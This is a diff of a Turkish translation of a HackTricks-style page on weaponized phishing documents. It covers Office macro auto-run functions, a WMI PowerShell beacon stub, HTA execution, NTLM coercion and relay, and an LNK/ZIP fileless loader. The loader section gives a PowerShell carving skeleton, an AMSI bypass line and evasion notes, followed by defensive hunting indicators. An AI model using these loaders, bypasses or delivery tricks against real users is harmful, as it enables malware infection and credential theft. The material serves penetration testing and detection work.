@@ -1,35 +1,35 @@
-# Phishing Dosyaları ve Belgeler
+# Phishing Dosyalar & Belgeler
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Office Belgeleri
 
-Microsoft Word, bir dosyayı açmadan önce dosya verisi doğrulaması gerçekleştirir. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde yapılır. Veri yapı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.
+Microsoft Word, bir dosyayı açmadan önce dosya verisi doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.
 
-Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneğini korumak mümkündür.\
-Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak DOCM uzantılı bir dosya RTF olarak yeniden adlandırılırsa Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
-Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'in tüm yazılımları için geçerlidir (Excel, PowerPoint vb.).
+Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirip dosyanın adını yeniden vererek makro çalıştırma yeteneği korunabilir.\
+Örneğin, RTF formatı tasarım gereği makroları desteklemez, ancak DOCM olarak adlandırılmış bir dosya RTF'ye yeniden adlandırıldığında Microsoft Word tarafından işlenir ve makro çalıştırabilir hale gelir.\
+Aynı iç yapı ve mekanizmalar Microsoft Office Suite'in (Excel, PowerPoint etc.) tüm yazılımları için de geçerlidir.
 
-Aşağıdaki komutu, bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için kullanabilirsiniz:
+Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX dosyaları makrolar içeren uzak bir şablona referans verdiğinde (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir”.
+DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
 
 ### Harici Resim Yükleme
 
-Git: _Insert --> Quick Parts --> Field_\
+Şuraya gidin: _Insert --> Quick Parts --> Field_\  
 _**Kategoriler**: Links and References, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-Belgeden rastgele kod çalıştırmak için macros kullanılabilir.
+Belgeden arbitrary code çalıştırmak için macros kullanmak mümkündür.
 
 #### Otomatik yükleme fonksiyonları
 
-Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılıkları o kadar artar.
+Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılıkları o kadar yüksektir.
 
 - AutoOpen()
 - Document_Open()
@@ -64,26 +64,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Metaverileri elle kaldır
+#### Meta verilerini elle kaldır
 
-Git **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.
+Şuraya gidin: **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** yanında bulunan **Remove All**'a tıklayın.
 
-#### Doc Extension
+#### Doc Uzantısı
 
-Tamamlandığında, **Save as type** açılır menüsünü seçin, formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
-Bunun nedeni, **you **can't save macro's inside a `.docx`** ve macro-enabled **`.docm`** uzantısı etrafında bir **stigma** olmasıdır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta ağ geçitleri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension is the best compromise**.
+İşiniz bittikten sonra **Save as type** açılır menüsünü seçin, formatı **`.docx`**'ten **Word 97-2003 `.doc`**'a değiştirin.\
+Bunun nedeni, **`.docx`** içine makroları kaydedememeniz ve makro etkin **`.docm`** uzantısının etrafında bir **stigma** olmasıdır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşıdır**.
 
-#### Malicious Macros Generators
+#### Kötü Amaçlı Makro Üreticileri
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## HTA Dosyaları
 
-HTA, HTML ile betik dillerini (ör. VBScript ve JScript) birleştiren bir Windows programıdır. Kullanıcı arayüzünü üretir ve bir tarayıcının güvenlik modeli kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalıştırılır.
+Bir HTA, **HTML ve script dillerini (örneğin VBScript ve JScript)** birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam güvenilir" bir uygulama olarak çalışır.
 
-Bir HTA, genellikle **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **installed** olur ve bu da **`mshta` dependant on IE** olmasını sağlar. Bu nedenle Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
+Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **yüklü** gelir, bu da **`mshta`**'nın IE'ye bağımlı olmasına neden olur. Bu nedenle, Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## NTLM Kimlik Doğrulamasını Zorlama
+## NTLM Authentication'ı Zorlama
 
-NTLM kimlik doğrulamasını **"uzaktan"** zorlamanın birkaç yolu vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana, klasörü **açmak**la **tetiklenecek** **bir kimlik doğrulamasını** başlatacak **dosya adresleri** gönderebilirsiniz.
+Several ways to **force NTLM authentication "remotely"**, örneğin kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbanın sadece **klasörü açmasıyla** bir **authentication** tetikleyecek **dosyaların adresini** gönderebilirsiniz.
 
-**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**
+**Aşağıdaki sayfalarda bu fikirleri ve daha fazlasını inceleyin:**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ NTLM kimlik doğrulamasını **"uzaktan"** zorlamanın birkaç yolu vardır; ör
 
 ### NTLM Relay
 
-Hash'i veya kimlik doğrulamayı çalmanın yanı sıra, ayrıca **NTLM relay attacks** gerçekleştirebileceğinizi unutmayın:
+Unutmayın, sadece hash'i veya authentication'ı çalamazsınız, aynı zamanda **perform NTLM relay attacks** da yapabilirsiniz:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Oldukça etkili kampanyalar, içinde iki meşru sahte belge (PDF/DOCX) ve kötü amaçlı bir .lnk bulunan bir ZIP gönderir. Hile şudur: gerçek PowerShell loader, ZIP'in ham baytlarının içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte çıkarır ve tamamen çalıştırır.
+Oldukça etkili kampanyalar iki meşru tuzak belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Hile şudur: gerçek PowerShell loader, ZIP’in ham byte'larının içinde benzersiz bir işaretleyiciden sonra saklanır ve .lnk onu bellekte çıkarır ve tamamen çalıştırır.
 
-. ln k tek satırlık PowerShell tarafından uygulanan tipik akış:
+.lnk PowerShell one-liner tarafından uygulanan tipik akış:
 
-1) Orijinal ZIP'i yaygın yollar içinde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve şu anki çalışma dizininin üst dizini.
-2) ZIP baytlarını okuyun ve sabit kodlu bir işaretçi bulun (ör. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
-3) ZIP'i %ProgramData% içine kopyalayın, orada çıkarın ve meşru görünmesi için sahte .docx'i açın.
-4) Mevcut işlem için AMSI'yi atlayın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Bir sonraki aşamadaki obfuskasyonu kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.
+1) Orijinal ZIP'i yaygın yollar içinde bul: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst klasörü.
+2) ZIP byte'larını oku ve sert kodlanmış bir marker (ör. xFIQCV) bul. Marker'dan sonraki her şey gömülü PowerShell payload'tır.
+3) ZIP'i %ProgramData% içine kopyala, orada çıkar ve meşru görünmesi için tuzak .docx'i aç.
+4) Geçerli süreç için AMSI'yi atla: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Sonraki aşamayı deobfuscate et (ör. tüm # karakterlerini kaldır) ve bellekte çalıştır.
 
-Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:
+Example PowerShell skeleton to carve and run the embedded stage:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -191,25 +191,25 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notlar
-- Teslimat genellikle saygın PaaS alt alan adlarını (ör. *.herokuapp.com) kötüye kullanır ve payload'ları gate'leyebilir (IP/UA'ya göre zararsız ZIP'ler sunar).
-- Bir sonraki aşama sık sık base64/XOR shellcode'u çözer ve disk izlerini en aza indirmek için Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.
+- Teslimat genellikle saygın PaaS alt alan adlarını kötüye kullanır (örn., *.herokuapp.com) ve yükleri kısıtlayabilir (IP/UA'ya göre zararsız ZIP'ler sunabilir).
+- Bir sonraki aşama genellikle base64/XOR shellcode'unu çözer ve disk artefaktlarını azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.
 
-Aynı zincirde kullanılan persistence
-- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
+Persistence used in the same chain
+- COM TypeLib hijacking of the Microsoft Web Browser control — böylece IE/Explorer veya onu içeren herhangi bir uygulama payload'u otomatik olarak yeniden başlatır. Ayrıntılar ve hazır komutlar için buraya bakın:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- Arşiv verisinin sonuna eklenmiş ASCII marker string (ör. xFIQCV) içeren ZIP dosyaları.
-- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir aldatıcı doküman açan .lnk.
-- AMSI'ye müdahale via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Uzun süre çalışan business thread'ler güvenilir PaaS domain'lerinde barındırılan linklerle sona erer.
+- Arşiv verisine eklenmiş ASCII işaretçi dizisini (örn., xFIQCV) içeren ZIP dosyaları.
+- ZIP'i bulmak için üst/kullanıcı klasörlerini tarayan ve bir decoy document açan .lnk.
+- AMSI'ye müdahale, [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla.
+- Güvenilen PaaS alan adlarında barındırılan linklerle sonuçlanan uzun süre çalışan iş parçacıkları.
 
 ## NTLM hash'lerini çalmak için Windows dosyaları
 
-Şu sayfaya bakın: **places to steal NTLM creds**:
+İlgili sayfaya bakın: **places to steal NTLM creds**:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
